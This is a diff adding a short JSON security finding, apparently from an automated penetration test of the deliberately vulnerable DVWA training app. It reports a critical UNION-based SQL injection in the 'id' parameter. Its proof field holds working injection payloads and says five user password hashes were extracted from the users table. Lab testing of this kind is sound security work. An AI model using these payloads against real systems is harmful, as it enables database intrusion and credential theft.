@@ -1,0 +1,10 @@
+{
+  "title": "SQL Injection (UNION-based) in id parameter - /vulnerabilities/sqli/",
+  "location": "/vulnerabilities/sqli",
+  "severity": "critical",
+  "proof": "id=1' UNION SELECT user(),database()-- - returns First name: app@localhost, Surname: dvwa. id=1' UNION SELECT version(),@@version_compile_os-- - returns First name: 10.1.26-MariaDB-0+deb9u1, Surname: debian-linux-gnu. Extracted 5 user password hashes via UNION SELECT user,password FROM users.",
+  "stage": "class_probe",
+  "precondition": "Authenticated session (low security level)",
+  "affected_actor": "admin",
+  "affected_resource": "vulnerability_sqli"
+}
